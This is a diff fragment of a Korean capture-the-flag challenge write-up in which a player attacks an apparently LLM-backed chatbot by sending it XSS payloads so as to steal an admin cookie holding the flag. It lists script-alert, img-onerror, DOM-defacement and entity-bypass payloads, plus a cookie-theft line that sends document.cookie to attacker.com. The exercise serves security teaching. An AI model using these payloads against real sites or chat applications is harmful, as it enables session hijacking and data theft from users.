@@ -26,15 +26,15 @@ XSS 페이로드 실행 시 플래그를 획득할 수 있다. HTML이 로드되
 
 🎯 공략 대상: J 대리는 악성 JavaScript 코드를 다양한 입력 벡터에 삽입하여 악용할 수 있다.
 
-- 악성 스크립트 삽입: 챗봇에게 <script>alert('XSS')</script> 같은 JavaScript 코드를 포함한 메시지를 전송한다.
+    - 악성 스크립트 삽입: 챗봇에게 <script>alert('XSS')</script> 같은 JavaScript 코드를 포함한 메시지를 전송한다.
 
-- 쿠키 탈취 페이로드: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script> 같은 코드로 관리자 쿠키를 외부 서버로 전송한다.
+    - 쿠키 탈취 페이로드: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script> 같은 코드로 관리자 쿠키를 외부 서버로 전송한다.
 
-- DOM 조작: <script>document.body.innerHTML = '<h1>Hacked!</h1>'</script> 같은 코드로 HTML 문서를 조작한다.
+    - DOM 조작: <script>document.body.innerHTML = '<h1>Hacked!</h1>'</script> 같은 코드로 HTML 문서를 조작한다.
 
-- 이미지 태그 활용: <img src=x onerror="alert('XSS')">처럼 이미지 오류 이벤트를 이용한 스크립트 실행도 가능하다.
+    - 이미지 태그 활용: <img src=x onerror="alert('XSS')">처럼 이미지 오류 이벤트를 이용한 스크립트 실행도 가능하다.
 
-- HTML 엔티티 우회: 필터링이 있다면 &lt;script&gt; 같은 HTML 엔티티를 이용해 우회를 시도할 수 있다.
+    - HTML 엔티티 우회: 필터링이 있다면 &lt;script&gt; 같은 HTML 엔티티를 이용해 우회를 시도할 수 있다.
 
 생성된 HTML 파일에서는 admin_session=ctf05_flag 쿠키가 설정되므로, J 대리가 이를 탈취하면 플래그를 획득할 수 있다.
 
